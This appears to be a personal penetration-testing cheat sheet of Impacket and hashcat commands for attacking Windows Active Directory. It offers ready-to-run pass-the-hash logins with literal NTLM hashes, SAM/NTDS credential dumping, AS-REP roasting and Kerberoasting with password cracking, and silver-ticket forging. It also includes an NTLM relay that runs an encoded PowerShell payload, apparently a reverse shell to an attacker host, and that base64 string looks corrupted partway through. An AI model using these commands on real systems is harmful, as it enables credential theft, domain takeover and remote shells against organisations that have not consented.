*use impacket-psexec to connect with ntlm hash aka pash the hash*
```c
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.250.212
```

IF ON WINDOWS BOX AND YOU HAVE BACK UP OF SYSTEM32/SAM AND SYSTEM32/SYSTEM, download them and crack!
```c
secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
```

```c
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc cG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCakFHc0FaUUIwQUhNQUxnQlVBRU1BVUFCREFHd0FhUUJsQUc0QWRBQW9BQ0lBTVFBNUFESUFMZ0F4QURZQU9BQXVBRFFBTlFBdUFESUFNUUF3QUNJQUxBQTBBRFFBTkFBMEFDa0FPd0FrQUhNQWRBQnlBR1VBWVFCdEFDQUFQUUFnQUNRQVl3QnNBR2tBWlFCdUFIUUFMZ0JIQUdVQWRBQlRBSFFBY2dCbEFHRUFiUUFvQUNrQU93QmJBR0lBZVFCMEFHVUFXd0JkQUYwQUpBQmlBSGtBZEFCbEFITUFJQUE5QUNBQU1BQXVBQzRBTmdBMUFEVUFNd0ExQUh3QUpRQjdBREFBZlFBN0FIY0FhQUJwQUd3QVpRQW9BQ2dBSkFCcEFDQUFQUUFnQUNRQWN3QjBBSElBWlFCaEFHMEFMZ0JTQUdVQVlRQmtBQ2dBSkFCaUFIa0FkQUJsQUhNQUxBQWdBREFBTEFBZ0FDUUFZZ0I1QUhRQVpRQnpBQzRBVEFC-09=]bEFHNEFad0IwQUdnQUtRQXBBQ0FBTFFCdUFHVUFJQUF3QUNrQWV3QTdBQ1FBWkFCaEFIUUFZUUFnQUQwQUlBQW9BRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFBdEFGUUFlUUJ3QUdVQVRnQmhBRzBBWlFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVkFCbEFIZ0FkQUF1QUVFQVV3QkRBRWtBU1FCRkFHNEFZd0J2QUdRQWFRQnVBR2NBS1FBdUFFY0FaUUIwQUZNQWRBQnlBR2tBYmdCbkFDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBd0FDd0FJQUFrQUdrQUtRQTdBQ1FBY3dCbEFHNEFaQUJpQUdFQVl3QnJBQ0FBUFFBZ0FDZ0FhUUJsQUhnQUlBQWtBR1FBWVFCMEFHRUFJQUF5QUQ0QUpnQXhBQ0FBZkFBZ0FFOEFkUUIwQUMwQVV3QjBBSElBYVFCdUFHY0FJQUFwQURzQUpBQnpBR1VBYmdCa0FHSUFZUUJqQUdzQU1nQWdBRDBBSUFBa0FITUFaUUJ1QUdRQVlnQmhBR01BYXdBZ0FDc0FJQUFpQUZBQVV3QWdBQ0lBSUFBckFDQUFLQUJ3QUhjQVpBQXBBQzRBVUFCaEFIUUFhQUFnQUNzQUlBQWlBRDRBSUFBaUFEc0FKQUJ6QUdVQWJnQmtBR0lBZVFCMEFHVUFJQUE5QUNBQUtBQmJBSFFBWlFCNEFIUUFMZ0JsQUc0QVl3QnZBR1FBYVFCdUFHY0FYUUE2QURvQVFRQlRBRU1BU1FCSkFDa0FMZ0JIQUdVQWRBQkNBSGtBZEFCbEFITUFLQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0F5QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUM0QVZ3QnlBR2tBZEFCbEFDZ0FKQUJ6QUdVQWJnQmtBR0lBZVFCMEFHVUFMQUF3QUN3QUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxnQk1BR1VBYmdCbkFIUUFhQUFwQURzQUpBQnpBSFFBY2dCbEFHRUFiUUF1QUVZQWJBQjFBSE1BYUFBb0FDa0FmUUE3QUNRQVl3QnNBR2tBWlFCdUFIUUFMZ0JEQUd3QWJ3QnpBR1VBS0FBcEFBPT0="
```
*-no-http-server to disable the HTTP server since we are relaying an SMB connection and -smb2support to add support for SMB2.


#### AS-REP Roasting from kali
```c
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

```c
hashcat --help | grep -i "Kerberos"
```


```c
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### Impacket

```c
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
impacket-smbserver local . -smb2support
```

##### [](https://github.com/0xsyr0/OSCP#impacket-smbclient)impacket-smbclient

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
```

##### [](https://github.com/0xsyr0/OSCP#impacket-gettgt)impacket-getTGT

```c
impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

##### [](https://github.com/0xsyr0/OSCP#impacket-getnpusers)impacket-GetNPUsers

```c
impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
```

##### [](https://github.com/0xsyr0/OSCP#impacket-getuserspns)impacket-getUserSPNs

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
```

##### [](https://github.com/0xsyr0/OSCP#impacket-secretsdump)impacket-secretsdump

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

##### [](https://github.com/0xsyr0/OSCP#impacket-psexec)impacket-psexec

```c
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

##### [](https://github.com/0xsyr0/OSCP#impacket-ticketer)impacket-ticketer

###### [](https://github.com/0xsyr0/OSCP#requirements)Requirements

- Valid User
- NTHASH
- Domain-SID

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
```

##### [](https://github.com/0xsyr0/OSCP#fixing---exceptions-must-derive-from-baseexception)Fixing [-] exceptions must derive from BaseException

###### [](https://github.com/0xsyr0/OSCP#issue)Issue

```c
impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

###### [](https://github.com/0xsyr0/OSCP#how-to-fix-it)How to fix it

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

##### [](https://github.com/0xsyr0/OSCP#dacleditpy)dacledit.py

> [https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py](https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py)

```c
$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
```

###### [](https://github.com/0xsyr0/OSCP#fixing-msada_guids-error)Fixing msada_guids Error

```c
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```